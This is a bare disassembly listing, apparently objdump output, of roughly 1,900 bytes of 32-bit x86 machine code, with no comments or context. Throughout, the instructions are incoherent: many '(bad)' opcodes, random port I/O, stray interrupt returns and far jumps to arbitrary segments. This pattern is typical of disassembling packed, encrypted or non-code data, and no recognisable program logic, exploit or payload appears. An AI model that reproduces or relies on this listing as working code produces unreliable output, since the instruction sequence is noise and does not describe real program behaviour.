  41ebc6:	mul    BYTE PTR [edi+0xfb741ef]
  41ebcc:	jnp    0x41ebdb
  41ebce:	mov    eax,0x1830b32
  41ebd3:	ss adc eax,0xa27dc258
  41ebd9:	fst    QWORD PTR [ebx-0xc]
  41ebdc:	sbb    ah,al
  41ebde:	das    
  41ebdf:	mov    al,ds:0x310c4dc8
  41ebe4:	and    edx,DWORD PTR [ecx-0x70]
  41ebe7:	test   al,0xd1
  41ebe9:	adc    al,0xe1
  41ebeb:	push   0xffffffdc
  41ebed:	mov    esp,0xdf542ad6
  41ebf2:	add    bh,BYTE PTR [esi-0x659ec206]
  41ebf8:	out    dx,eax
  41ebf9:	shl    ecx,0xda
  41ebfc:	or     BYTE PTR [eax-0x181e1f14],al
  41ec02:	or     ebx,DWORD PTR [esi+0x67]
  41ec05:	inc    edx
  41ec06:	pop    edx
  41ec07:	jl     0x41ebe2
  41ec09:	xchg   esp,eax
  41ec0a:	dec    ebx
  41ec0b:	sbb    al,0x24
  41ec0d:	pusha  
  41ec0e:	push   cs
  41ec0f:	sbb    ebx,DWORD PTR [esi-0x521090dd]
  41ec15:	dec    esp
  41ec16:	ins    DWORD PTR es:[edi],dx
  41ec17:	ja     0x41ec2b
  41ec19:	add    esp,DWORD PTR [esi]
  41ec1b:	or     eax,0x88ba5334
  41ec20:	mov    ds:0x3f4e85d3,eax
  41ec25:	(bad)  
  41ec26:	adc    BYTE PTR [esi+edi*2],al
  41ec29:	jle    0x41ec66
  41ec2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec2c:	je     0x41ec76
  41ec2e:	shl    ch,1
  41ec30:	xor    eax,0x7490e088
  41ec35:	push   eax
  41ec36:	jno    0x41ec76
  41ec38:	or     dl,BYTE PTR [ecx]
  41ec3a:	js     0x41ec15
  41ec3c:	ja     0x41ec55
  41ec3e:	adc    BYTE PTR [ebp+0x5e04d189],ah
  41ec44:	cs and al,0x24
  41ec47:	xchg   edx,eax
  41ec48:	and    bh,dl
  41ec4a:	fcom   st(4)
  41ec4c:	push   ecx
  41ec4d:	out    0x3b,eax
  41ec4f:	dec    ecx
  41ec50:	and    eax,0x19e802f5
  41ec55:	add    DWORD PTR [ecx],edx
  41ec57:	add    bl,BYTE PTR [ecx-0x4d]
  41ec5a:	inc    ecx
  41ec5b:	jp     0x41ec39
  41ec5d:	and    BYTE PTR [edx-0x51],ch
  41ec60:	mov    eax,ds:0x1732af92
  41ec65:	ret    0x6c
  41ec68:	ret    
  41ec69:	enter  0xafc3,0x4c
  41ec6d:	mov    al,0x50
  41ec6f:	fwait
  41ec70:	loope  0x41ece4
  41ec72:	mov    cl,0x48
  41ec74:	aam    0xbc
  41ec76:	dec    eax
  41ec77:	ja     0x41ece0
  41ec79:	mov    al,BYTE PTR [ebx+0x106347be]
  41ec7f:	loop   0x41ecb0
  41ec81:	scas   eax,DWORD PTR es:[edi]
  41ec82:	xor    bh,BYTE PTR [ecx]
  41ec84:	mov    ebx,0x1699adc8
  41ec89:	or     DWORD PTR [ebp-0x3e],eax
  41ec8c:	fidiv  WORD PTR [esi]
  41ec8e:	dec    edi
  41ec8f:	out    dx,eax
  41ec90:	sbb    eax,0xcfbbb5b1
  41ec95:	hlt    
  41ec96:	int3   
  41ec97:	cmp    al,0x93
  41ec99:	push   ebx
  41ec9a:	push   ebx
  41ec9b:	pop    esp
  41ec9c:	mov    eax,0xcf01bba0
  41eca1:	iret   
  41eca2:	int    0x70
  41eca4:	jo     0x41ec5e
  41eca6:	retf   
  41eca7:	(bad)  
  41eca9:	cmp    DWORD PTR ds:[esi-0x71],0xffffffe5
  41ecae:	test   DWORD PTR [ecx],edi
  41ecb0:	jmp    0xaf50:0x2c9c5825
  41ecb7:	adc    al,0x49
  41ecb9:	(bad)  
  41ecba:	push   ds
  41ecbb:	lock ins BYTE PTR es:[edi],dx
  41ecbd:	jecxz  0x41ec57
  41ecbf:	sub    ebp,0xffffffe7
  41ecc2:	je     0x41ec8e
  41ecc4:	add    ebx,edx
  41ecc6:	lds    ecx,FWORD PTR [edi+ecx*8-0x3c3bd808]
  41eccd:	cmp    eax,0xe8761e26
  41ecd2:	jge    0x41ed41
  41ecd4:	popf   
  41ecd5:	jmp    0x41eca4
  41ecd7:	jge    0x41ec5b
  41ecd9:	jbe    0x41ec76
  41ecdb:	pop    edx
  41ecdc:	mov    eax,ds:0x6ae83447
  41ece1:	xchg   ebx,eax
  41ece2:	ins    BYTE PTR es:[edi],dx
  41ece3:	push   0x4693626c
  41ece8:	fwait
  41ece9:	jp     0x41ece5
  41eceb:	inc    DWORD PTR [ebp+eiz*8+0x70]
  41ecef:	pop    esi
  41ecf0:	fidiv  DWORD PTR [esi-0x75688975]
  41ecf6:	mov    edx,0x6b277cd4
  41ecfb:	sub    al,0xe9
  41ecfd:	fucom  st(2)
  41ecff:	leave  
  41ed00:	(bad)  
  41ed01:	xlat   BYTE PTR ds:[ebx]
  41ed02:	xor    BYTE PTR [esi+0x10],bl
  41ed05:	push   esi
  41ed06:	sbb    al,0xe7
  41ed08:	imul   edi,DWORD PTR [eax-0x7485692],0x7474d202
  41ed12:	jg     0x41ed1c
  41ed14:	jl     0x41ed73
  41ed16:	dec    ebx
  41ed17:	loop   0x41ecaa
  41ed19:	out    0x87,eax
  41ed1b:	js     0x41ecb6
  41ed1d:	inc    esi
  41ed1e:	adc    al,BYTE PTR [ecx+0x70a7fb07]
  41ed24:	jne    0x41ece7
  41ed26:	clc    
  41ed27:	mov    edx,edx
  41ed29:	pushf  
  41ed2a:	data16 xchg BYTE PTR [ecx-0x71ddc6d],cl
  41ed31:	pop    ss
  41ed32:	and    al,0xda
  41ed34:	and    al,0x39
  41ed36:	add    ah,BYTE PTR [esi-0x8]
  41ed39:	and    ecx,DWORD PTR [ebp+0x15214546]
  41ed3f:	adc    eax,0x7f5b4784
  41ed44:	xchg   esp,eax
  41ed45:	jg     0x41ed68
  41ed47:	add    BYTE PTR [esi-0x36dbd705],bh
  41ed4d:	pop    ss
  41ed4e:	inc    esp
  41ed4f:	retf   
  41ed50:	xchg   edx,eax
  41ed51:	cmp    bl,BYTE PTR [edx+0x46484316]
  41ed57:	adc    ebp,DWORD PTR [eax]
  41ed59:	iret   
  41ed5a:	sub    al,0xa0
  41ed5c:	rcr    BYTE PTR [ebx],cl
  41ed5e:	xor    DWORD PTR [eax+0x376d696a],edx
  41ed64:	jb     0x41ed56
  41ed66:	repz cwde 
  41ed68:	outs   dx,DWORD PTR ds:[esi]
  41ed69:	data16 mov BYTE PTR [esi-0x3d96c82d],ch
  41ed70:	cdq    
  41ed71:	data16 xor al,0xeb
  41ed74:	push   eax
  41ed75:	and    al,0x67
  41ed77:	push   eax
  41ed78:	dec    ecx
  41ed79:	in     al,0x0
  41ed7b:	ins    BYTE PTR es:[edi],dx
  41ed7c:	mov    ebx,0x961b2927
  41ed81:	ins    BYTE PTR es:[edi],dx
  41ed82:	mov    al,0xcc
  41ed84:	pop    ecx
  41ed85:	in     al,dx
  41ed86:	mov    WORD PTR [edi+0x18],ss
  41ed89:	fcmove st,st(7)
  41ed8b:	cmp    eax,0x128042c4
  41ed90:	inc    ebx
  41ed91:	push   ss
  41ed92:	sub    eax,0x6e635925
  41ed97:	cmp    ebp,DWORD PTR [ecx-0x7]
  41ed9a:	pop    esi
  41ed9b:	sbb    edi,ebx
  41ed9d:	sub    DWORD PTR [edi+0x10],0xe939328d
  41eda4:	icebp  
  41eda5:	push   eax
  41eda6:	fild   QWORD PTR [edi+0x28]
  41eda9:	and    BYTE PTR [edi-0x6708bd69],0xe4
  41edb0:	lock cwde 
  41edb2:	inc    edx
  41edb3:	or     ch,BYTE PTR [edx]
  41edb5:	jnp    0x41ed4e
  41edb7:	call   0x107b:0xc959750f
  41edbe:	xchg   esp,eax
  41edbf:	popa   
  41edc0:	es or  al,0xf1
  41edc3:	mov    ebp,0xce808488
  41edc8:	xor    BYTE PTR [ebp-0x36],ah
  41edcb:	repz enter 0x80fc,0x72
  41edd0:	lods   eax,DWORD PTR ds:[esi]
  41edd1:	ret    0xb97c
  41edd4:	enter  0xc1ad,0x90
  41edd8:	ret    0x4476
  41eddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eddc:	shl    DWORD PTR [ebp+0x48a3ebd0],cl
  41ede2:	or     DWORD PTR [ebx],esi
  41ede4:	lahf   
  41ede5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede6:	inc    edx
  41ede7:	enter  0x70ea,0x40
  41edeb:	rcl    BYTE PTR [eax+0x1e23d874],0x76
  41edf2:	mov    eax,0xcbd641e1
  41edf7:	mov    ds:0xaf59e227,eax
  41edfc:	add    BYTE PTR [esi+0x5d],0x86
  41ee00:	push   ecx
  41ee01:	bound  esp,QWORD PTR [ebx]
  41ee03:	mov    esp,0x9a471d09
  41ee08:	jns    0x41ee21
  41ee0a:	ja     0x41eda7
  41ee0c:	fldcw  WORD PTR ss:[eax+0x3]
  41ee10:	arpl   WORD PTR [esi],bx
  41ee12:	mov    DWORD PTR [esi+0x1f],edx
  41ee15:	jmp    0x82d24efb
  41ee1a:	push   ebp
  41ee1b:	fmul   DWORD PTR [esi]
  41ee1d:	inc    ebx
  41ee1e:	dec    ecx
  41ee1f:	dec    ebp
  41ee20:	ds in  al,0x73
  41ee23:	sub    al,0x7e
  41ee25:	and    DWORD PTR [ecx+0x3142d804],ecx
  41ee2b:	sbb    al,0xe6
  41ee2d:	iret   
  41ee2e:	inc    esi
  41ee2f:	and    eax,DWORD PTR ds:0xbfed23f2
  41ee35:	mov    dl,BYTE PTR [ecx-0x1128f092]
  41ee3b:	ret    0xd54
  41ee3e:	xchg   BYTE PTR [esi+0x69],al
  41ee41:	nop
  41ee42:	push   0x1
  41ee44:	xchg   ecx,eax
  41ee45:	nop
  41ee46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee47:	(bad)  
  41ee48:	pop    ss
  41ee49:	mov    WORD PTR [ecx+0x75f58c32],?
  41ee4f:	test   al,0xbc
  41ee51:	jle    0x41ee77
  41ee53:	inc    ecx
  41ee54:	pop    edi
  41ee55:	arpl   WORD PTR [ecx-0x33],bp
  41ee58:	mov    ebx,cs
  41ee5a:	pop    fs
  41ee5c:	(bad)  
  41ee5e:	(bad)  
  41ee5f:	loope  0x41ee10
  41ee61:	cld    
  41ee62:	xchg   ebp,eax
  41ee63:	jg     0x41ee90
  41ee65:	cld    
  41ee66:	int3   
  41ee67:	mov    edi,0xbf8757fd
  41ee6c:	pop    ss
  41ee6d:	ds stc 
  41ee6f:	pop    esi
  41ee70:	pop    ds
  41ee71:	scas   eax,DWORD PTR es:[edi]
  41ee72:	test   DWORD PTR [eax],eax
  41ee74:	js     0x41ee67
  41ee76:	sub    edi,edi
  41ee78:	dec    ebp
  41ee79:	int    0xff
  41ee7b:	lea    edi,[edi]
  41ee7d:	jmp    DWORD PTR [ebx-0x51ccaea2]
  41ee83:	mov    ah,0xef
  41ee85:	(bad)  
  41ee86:	popa   
  41ee87:	cmp    bl,bl
  41ee89:	lock rcl ebx,cl
  41ee8c:	test   BYTE PTR ds:0x4fa38ec7,dl
  41ee92:	cld    
  41ee93:	add    esp,esp
  41ee95:	add    BYTE PTR [eax+0x6c],0xc8
  41ee99:	cmp    cl,dl
  41ee9b:	out    0x8a,eax
  41ee9d:	ss icebp 
  41ee9f:	jge    0x41ee8e
  41eea1:	inc    esp
  41eea2:	mov    dl,0x8e
  41eea4:	sbb    esi,DWORD PTR [edx-0x38]
  41eea7:	es push eax
  41eea9:	pop    esi
  41eeaa:	mov    ah,0xbb
  41eeac:	or     eax,0x20541a31
  41eeb1:	leave  
  41eeb2:	inc    eax
  41eeb3:	jbe    0x41ee5c
  41eeb5:	pop    eax
  41eeb6:	and    esp,esp
  41eeb8:	sub    al,0x87
  41eeba:	jp     0x41ee84
  41eebc:	test   esi,0xc343085c
  41eec2:	in     al,0xe6
  41eec4:	jle    0x41ee48
  41eec6:	pop    esp
  41eec7:	inc    esp
  41eec8:	inc    ebx
  41eec9:	enter  0x82b9,0x1e
  41eecd:	and    al,0xcc
  41eecf:	in     eax,0xab
  41eed1:	mov    esp,0x9bd8a9c1
  41eed6:	jno    0x41ee6a
  41eed8:	xchg   DWORD PTR [edi],ebp
  41eeda:	leave  
  41eedb:	or     al,0xff
  41eedd:	sbb    BYTE PTR [ecx+0x27],ah
  41eee0:	fimul  DWORD PTR ds:0xdda40180
  41eee6:	and    DWORD PTR [ecx],esi
  41eee8:	call   0x9acd:0x8c0e4ac6
  41eeef:	(bad)  
  41eef0:	cmp    dh,bh
  41eef2:	and    DWORD PTR [ebp-0x3affd7e8],eax
  41eef8:	and    bh,bh
  41eefa:	ds xor eax,0x468d8ce3
  41ef00:	adc    edi,ebx
  41ef02:	adc    eax,0xc48e113
  41ef07:	arpl   WORD PTR [ebx+0x712da350],bp
  41ef0d:	pushf  
  41ef0e:	fcmovb st,st(4)
  41ef10:	sbb    DWORD PTR [ebx],esi
  41ef12:	xchg   BYTE PTR [ecx+eax*4],ch
  41ef15:	ins    BYTE PTR es:[edi],dx
  41ef16:	push   0x991d36fe
  41ef1b:	ins    BYTE PTR es:[edi],dx
  41ef1c:	cs xchg ecx,esi
  41ef1f:	fwait
  41ef20:	sub    bl,ah
  41ef22:	and    ecx,ecx
  41ef24:	enter  0x3105,0x99
  41ef28:	leave  
  41ef29:	in     al,0x1c
  41ef2b:	out    0xe7,al
  41ef2d:	jnp    0x41ef15
  41ef2f:	ffree  st(5)
  41ef31:	xor    al,0xc3
  41ef33:	add    ebx,edi
  41ef35:	or     BYTE PTR [edi+0x32fda661],cl
  41ef3b:	imul   esp,DWORD PTR [esi-0x34],0x88384705
  41ef42:	push   edx
  41ef43:	mov    dh,0xa9
  41ef45:	mov    edi,0xc63e8c66
  41ef4a:	hlt    
  41ef4b:	xor    BYTE PTR [esi],ah
  41ef4d:	mov    bl,ch
  41ef4f:	cmovs  edx,DWORD PTR [ebx]
  41ef52:	cmp    BYTE PTR [ebx-0x3d],ch
  41ef55:	ror    BYTE PTR [ecx+ebx*4-0x7286de1d],cl
  41ef5c:	dec    eax
  41ef5d:	data16 rol BYTE PTR [ecx+ecx*4+0x2f738810],1
  41ef65:	xor    eax,0xbccf668e
  41ef6a:	push   0xffffffa0
  41ef6c:	jb     0x41ef6d
  41ef6e:	xchg   ecx,eax
  41ef6f:	and    al,0x18
  41ef71:	jns    0x41ef31
  41ef73:	push   esi
  41ef74:	inc    esi
  41ef75:	(bad)
  41ef78:	fist   DWORD PTR [ecx-0x9]
  41ef7b:	lock push es
  41ef7d:	jo     0x41ef6e
  41ef7f:	call   FWORD PTR [edi]
  41ef81:	ja     0x41ef3f
  41ef83:	mov    edi,0x3f4ff787
  41ef88:	in     eax,0xfd
  41ef8a:	aas    
  41ef8b:	mov    esp,0x840fc9c6
  41ef90:	dec    ecx
  41ef91:	imul   ebx,DWORD PTR [ecx-0x2e],0x33
  41ef95:	add    eax,0xa5b949de
  41ef9a:	cld    
  41ef9b:	js     0x41efdf
  41ef9d:	loopne 0x41ef4d
  41ef9f:	mov    ah,0x17
  41efa1:	or     eax,0x231ae7ed
  41efa6:	xor    edx,edx
  41efa8:	push   edi
  41efa9:	sbb    DWORD PTR [ebx+0x9063640],edx
  41efaf:	or     al,0xd4
  41efb1:	pop    ss
  41efb2:	mov    edi,0x44f03882
  41efb7:	jb     0x41efc4
  41efb9:	xcrypt-cfb (bad)
  41efba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efbb:	pusha  
  41efbc:	pop    ebx
  41efbd:	(bad)  
  41efbe:	sti    
  41efbf:	out    0x99,al
  41efc1:	out    dx,al
  41efc2:	add    dh,BYTE PTR ds:[esi+0x707c80ee]
  41efc9:	and    eax,DWORD PTR [esp+edx*4-0x1b]
  41efcd:	sbb    bl,BYTE PTR [edi]
  41efcf:	rol    DWORD PTR [esi+eiz*8+0x7724b2d5],1
  41efd6:	ss retf 0x2606
  41efda:	cmp    bh,ah
  41efdc:	retf   0x69ef
  41efdf:	xchg   esi,eax
  41efe0:	jnp    0x41ef98
  41efe2:	add    eax,0x954c0841
  41efe7:	inc    ebx
  41efe8:	leave  
  41efe9:	repz xchg ebx,eax
  41efeb:	pushf  
  41efec:	fdivr  DWORD PTR [ebp+0x65]
  41efef:	in     al,dx
  41eff0:	ins    BYTE PTR es:[edi],dx
  41eff1:	popa   
  41eff2:	jp     0x41f053
  41eff4:	idiv   DWORD PTR [edx]
  41eff6:	int3   
  41eff7:	xchg   esp,eax
  41eff8:	(bad)  
  41eff9:	aas    
  41effa:	or     eax,0x78110ff4
  41efff:	inc    ebp
  41f000:	enter  0xb422,0xc6
  41f004:	ss lahf 
  41f006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f007:	es jge 0x41f03f
  41f00a:	adc    eax,0x415ea344
  41f00f:	arpl   WORD PTR [eax+0x4],bp
  41f012:	xchg   esi,eax
  41f013:	es push cs
  41f015:	int3   
  41f016:	xor    eax,0x683656da
  41f01b:	adc    DWORD PTR [ecx],esp
  41f01d:	xchg   edi,eax
  41f01e:	loope  0x41f060
  41f020:	arpl   di,cx
  41f022:	cdq    
  41f023:	aas    
  41f024:	jecxz  0x41efc3
  41f026:	adc    eax,DWORD PTR [edi]
  41f028:	test   eax,0x173c5ff8
  41f02d:	add    DWORD PTR [ecx],edi
  41f02f:	pop    esi
  41f030:	ja     0x41effa
  41f032:	add    eax,0xa9ffd8a5
  41f037:	sub    DWORD PTR [edx+0x3920945c],0x1d
  41f03e:	jbe    0x41f017
  41f040:	pop    ds
  41f041:	and    edx,eax
  41f043:	gs pop ebx
  41f045:	scas   eax,DWORD PTR es:[edi]
  41f046:	sub    al,0xcd
  41f048:	test   DWORD PTR [esi-0xc0fcd24],esi
  41f04e:	mov    ecx,0x188d230b
  41f053:	ror    esp,cl
  41f055:	aam    0x81
  41f057:	sbb    BYTE PTR [esi+eiz*1],ah
  41f05a:	or     DWORD PTR [esi+0x1680a7d6],esp
  41f060:	out    dx,al
  41f061:	mov    esi,0xea5f99a7
  41f066:	or     al,0x4
  41f068:	push   ecx
  41f069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f06a:	into   
  41f06b:	stc    
  41f06c:	push   esi
  41f06d:	sar    bl,0x50
  41f070:	push   eax
  41f071:	clc    
  41f072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f073:	popa   
  41f074:	clc    
  41f075:	arpl   WORD PTR [edi-0xf83d8c5],di
  41f07b:	(bad)  
  41f07c:	imul   esp,DWORD PTR [ecx],0x0
  41f07f:	fdivr  st,st(5)
  41f081:	into   
  41f082:	xchg   edi,eax
  41f083:	add    bh,BYTE PTR [edi]
  41f085:	int    0x55
  41f087:	nop
  41f088:	in     eax,0x96
  41f08a:	sbb    al,0x4a
  41f08c:	pop    ebx
  41f08d:	ins    DWORD PTR es:[edi],dx
  41f08e:	pushf  
  41f08f:	out    0x9a,al
  41f091:	ficom  DWORD PTR [ebx-0x3a]
  41f094:	mov    ebx,0x2f6bd60b
  41f099:	jl     0x41f0bf
  41f09b:	fstp   QWORD PTR [esi-0x1d]
  41f09e:	sub    al,0x67
  41f0a0:	ins    BYTE PTR es:[edi],dx
  41f0a1:	pop    ecx
  41f0a2:	fst    st(0)
  41f0a4:	les    eax,FWORD PTR [eax]
  41f0a6:	add    BYTE PTR [eax],ah
  41f0a8:	add    BYTE PTR [ecx+0x44],cl
  41f0ab:	inc    ecx
  41f0ac:	push   esp
  41f0ad:	shr    DWORD PTR [edx+esi*8-0x194b7a7f],1
  41f0b4:	sbb    edx,esp
  41f0b6:	and    esi,esi
  41f0b8:	mov    dl,0xbc
  41f0ba:	mov    al,ds:0xd74fec43
  41f0bf:	fistp  DWORD PTR [ecx+edi*1+0x7f26ea4c]
  41f0c6:	add    BYTE PTR [ebx],0x61
  41f0c9:	int    0x67
  41f0cb:	mov    DWORD PTR [ecx],esp
  41f0cd:	jbe    0x41f0f0
  41f0cf:	inc    esi
  41f0d0:	das    
  41f0d1:	enter  0x9435,0x6c
  41f0d5:	inc    ebx
  41f0d6:	and    eax,0xdadb0f11
  41f0db:	int3   
  41f0dc:	pushf  
  41f0dd:	sub    ecx,ecx
  41f0df:	sub    al,0x43
  41f0e1:	and    ecx,DWORD PTR [edx+edx*8-0x314020d4]
  41f0e8:	es mov edx,0x964030e0
  41f0ee:	inc    edi
  41f0ef:	inc    ebx
  41f0f0:	les    edx,FWORD PTR [ecx+0x173c0b16]
  41f0f6:	xchg   edi,eax
  41f0f7:	js     0x41f093
  41f0f9:	inc    edi
  41f0fa:	ss and al,0x8f
  41f0fd:	and    dh,BYTE PTR [ecx]
  41f0ff:	sbb    bl,BYTE PTR [edx+0x5a]
  41f102:	lods   al,BYTE PTR ds:[esi]
  41f103:	mov    esi,edx
  41f105:	add    eax,0x64b19246
  41f10a:	adc    edx,DWORD PTR [esi]
  41f10c:	jno    0x41f18c
  41f10e:	dec    edx
  41f10f:	inc    esp
  41f110:	inc    esi
  41f111:	mov    al,ds:0xe27b92b6
  41f116:	push   cs
  41f117:	sub    bh,BYTE PTR [edi]
  41f119:	push   edi
  41f11a:	dec    edi
  41f11b:	js     0x41f0db
  41f11d:	mov    esi,0xe39f856
  41f122:	mov    ah,0xcc
  41f124:	mov    ecx,0x23ef3536
  41f129:	arpl   WORD PTR [eax],dx
  41f12b:	pop    edx
  41f12c:	or     BYTE PTR [edi+eax*1],bh
  41f12f:	rcr    DWORD PTR [ecx-0x317c7705],0xa
  41f136:	mov    al,ds:0x820211cc
  41f13b:	loopne 0x41f179
  41f13d:	sbb    eax,0x7c5bb7e7
  41f142:	stos   DWORD PTR es:[edi],eax
  41f143:	cld    
  41f144:	jge    0x41f0da
  41f146:	pop    ecx
  41f147:	bswap  ecx
  41f149:	stc    
  41f14a:	push   edi
  41f14b:	push   ds
  41f14c:	adc    al,0xa
  41f14e:	mov    ecx,0x399c4802
  41f153:	adc    edx,DWORD PTR [ebx]
  41f155:	shl    DWORD PTR [edi],1
  41f157:	hlt    
  41f158:	and    ebx,DWORD PTR [ebx]
  41f15a:	mov    WORD PTR [esi+ecx*8+0x446e85b8],fs
  41f161:	nop
  41f162:	clc    
  41f163:	sahf   
  41f164:	(bad)  
  41f165:	mov    edi,0xf3728150
  41f16a:	loope  0x41f183
  41f16c:	out    dx,eax
  41f16d:	push   ebp
  41f16f:	jg     0x41f158
  41f171:	mov    ch,0xe0
  41f173:	mov    ebp,0x9b107d0f
  41f178:	(bad)  
  41f179:	call   0xe216074d
  41f17e:	(bad)  [edi]
  41f180:	jp     0x41f187
  41f182:	repz add ebx,0x254d224d
  41f189:	imul   BYTE PTR [edi]
  41f18b:	or     esp,ebx
  41f18d:	dec    ecx
  41f18e:	jl     0x41f167
  41f190:	pop    esp
  41f191:	loop   0x41f1cc
  41f193:	out    0xa3,eax
  41f195:	int3   
  41f196:	mov    ds:0xf6c5f399,al
  41f19b:	pop    DWORD PTR [edx+0x28]
  41f19e:	xchg   eax,ebx
  41f1a0:	out    0xd,al
  41f1a2:	inc    edx
  41f1a3:	dec    esp
  41f1a4:	add    bh,bl
  41f1a6:	test   al,ch
  41f1a8:	test   DWORD PTR [eax-0x71f6ed94],ebx
  41f1ae:	arpl   WORD PTR [ecx-0x14],cx
  41f1b1:	je     0x41f136
  41f1b3:	sbb    al,0x44
  41f1b5:	loopne 0x41f1af
  41f1b7:	bound  ecx,QWORD PTR [eax+0x19]
  41f1ba:	adc    BYTE PTR [esi],0xa7
  41f1bd:	(bad)  
  41f1be:	adc    BYTE PTR [eax+0x55693468],ch
  41f1c4:	es jo  0x41f19b
  41f1c7:	(bad)  
  41f1c8:	std    
  41f1c9:	mov    ebx,0xfdcc3a45
  41f1ce:	inc    esp
  41f1cf:	loopne 0x41f231
  41f1d1:	scas   al,BYTE PTR es:[edi]
  41f1d2:	mov    ebx,esp
  41f1d4:	pop    esp
  41f1d5:	ror    al,0x67
  41f1d8:	cmp    BYTE PTR [edx],0x52
  41f1db:	enter  0x50d3,0xd
  41f1df:	jae    0x41f16c
  41f1e1:	mov    al,ds:0x7ce8d40c
  41f1e6:	leave  
  41f1e7:	mov    ebx,0x8f7f6ba
  41f1ec:	jmp    0x1162:0xc645de72
  41f1f3:	xchg   ebx,esi
  41f1f5:	sbb    al,0xf7
  41f1f7:	adc    BYTE PTR [ebx+0x59],bh
  41f1fa:	pusha  
  41f1fb:	mov    esi,0x99cf3bdd
  41f200:	sub    esi,DWORD PTR [edi-0x4bb27c59]
  41f206:	jb     0x41f1e6
  41f208:	pop    edi
  41f209:	xchg   ecx,eax
  41f20a:	xor    ebp,DWORD PTR [esi-0x20]
  41f20d:	sbb    ebp,DWORD PTR ds:0xb73f20eb
  41f213:	or     eax,0x605fbc97
  41f218:	sbb    bh,dl
  41f21a:	ss jbe 0x41f20e
  41f21d:	jb     0x41f1c6
  41f21f:	mov    ds:0xc2650384,al
  41f224:	adc    ah,BYTE PTR [ebx+0x12]
  41f227:	ficom  DWORD PTR [edi+ebp*2+0x4da53779]
  41f22e:	or     DWORD PTR [ecx+0x10],esi
  41f231:	mov    esp,DWORD PTR [eax]
  41f233:	or     eax,DWORD PTR [ebx-0x3]
  41f236:	scas   al,BYTE PTR es:[edi]
  41f237:	push   ecx
  41f238:	mov    al,ds:0xc8544095
  41f23d:	add    eax,0x24174490
  41f242:	xor    DWORD PTR [edx+ecx*1],0xfffffff2
  41f246:	test   DWORD PTR [edx+eax*2+0x20a497c7],0x401f6828
  41f251:	pop    eax
  41f252:	test   DWORD PTR [edx-0x9],ecx
  41f255:	jmp    0xd36c4669
  41f25a:	pop    ss
  41f25b:	mov    esi,0xf83f067b
  41f260:	jecxz  0x41f2a5
  41f262:	pop    ss
  41f263:	add    dh,bl
  41f265:	fabs   
  41f267:	fwait
  41f268:	shl    eax,1
  41f26a:	in     al,0x86
  41f26c:	push   edi
  41f26d:	pusha  
  41f26e:	xchg   esp,eax
  41f26f:	icebp  
  41f270:	sbb    eax,0x83e79067
  41f275:	pop    ebx
  41f276:	push   ss
  41f277:	ins    BYTE PTR es:[edi],dx
  41f278:	popa   
  41f279:	jne    0x41f211
  41f27b:	adc    esp,DWORD PTR [edx+0x66891d0d]
  41f281:	adc    al,BYTE PTR [esi]
  41f283:	aaa    
  41f284:	xlat   BYTE PTR ds:[ebx]
  41f285:	test   DWORD PTR [esi+0x1],esp
  41f288:	inc    ebx
  41f289:	mov    bl,0x78
  41f28b:	mov    dh,0xb8
  41f28d:	enter  0x96d1,0xa2
  41f291:	jne    0x41f310
  41f293:	iret   
  41f294:	popa   
  41f295:	outs   dx,BYTE PTR ds:[esi]
  41f296:	sar    esi,1
  41f298:	pop    ecx
  41f299:	dec    esi
  41f29a:	sbb    BYTE PTR [edi+0x50617e6a],ch
  41f2a0:	xor    DWORD PTR [ebx],eax
  41f2a2:	enter  0xdb4,0x1b
  41f2a6:	sbb    esp,DWORD PTR [edx]
  41f2a8:	mov    dl,0x5b
  41f2aa:	dec    esp
  41f2ab:	xchg   ebx,eax
  41f2ac:	imul   esp,DWORD PTR [edx],0xc
  41f2af:	popa   
  41f2b0:	cli    
  41f2b1:	push   cs
  41f2b2:	ror    DWORD PTR [ecx-0xc],0xc1
  41f2b6:	aaa    
  41f2b7:	mov    ebx,fs
  41f2b9:	and    cl,BYTE PTR [ebx]
  41f2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2bc:	repnz and dl,BYTE PTR [ebx]
  41f2bf:	or     edx,0xcae6e260
  41f2c5:	xor    DWORD PTR [ecx],esp
  41f2c7:	shl    BYTE PTR [ebx+0x64],1
  41f2ca:	mov    bh,0xb3
  41f2cc:	add    bl,BYTE PTR [ebx-0x56e110ed]
  41f2d2:	and    ebp,DWORD PTR [eax+0x4]
  41f2d5:	popa   
  41f2d6:	mov    ecx,0xeb764e49
  41f2db:	xor    eax,0x80474e61
  41f2e0:	or     BYTE PTR [ebx],ah
  41f2e2:	mov    esp,esi
  41f2e4:	adc    al,0x46
  41f2e6:	push   es
  41f2e7:	mov    bl,0x56
  41f2e9:	sub    bl,BYTE PTR [edi+0x27]
  41f2ec:	pop    ebx
  41f2ed:	shl    ch,0x3e
  41f2f0:	iret   
  41f2f1:	and    BYTE PTR [esi],bl
  41f2f3:	in     eax,0x54
  41f2f5:	fnstsw WORD PTR [ecx-0x160ec31f]
  41f2fb:	enter  0x45d8,0x9b
  41f2ff:	dec    edx
  41f300:	mov    dh,0x9d
  41f302:	sti    
  41f303:	dec    esp
  41f304:	icebp  
  41f305:	lods   eax,DWORD PTR ds:[esi]
  41f306:	dec    eax
  41f307:	and    ecx,DWORD PTR [esi+0x889ccd4]
  41f30d:	dec    esi
  41f30e:	sub    ebp,ebp
  41f310:	xor    eax,0x2c168856
  41f315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f316:	add    edx,DWORD PTR [eax-0x77ced253]
  41f31c:	iret   
  41f31d:	div    DWORD PTR [ebp+0x599acf73]
  41f323:	xchg   BYTE PTR [esi+0x7908d0c2],al
  41f329:	das    
  41f32a:	jg     0x41f2e2
  41f32c:	or     BYTE PTR ds:0x22e02be9,dl
  41f332:	retf   
  41f333:	rcl    bh,0x48
  41f336:	das    
  41f337:	or     BYTE PTR [eax+eax*8+0x17e00b08],dh
  41f33e:	mov    ah,0x73
  41f340:	(bad)  
  41f341:	das    
  41f342:	inc    ebx
  41f343:	mov    cl,0x1a
  41f345:	pop    ss
  41f346:	or     esp,DWORD PTR [edi-0x50dd06a1]
  41f34c:	shl    ecx,0xa1
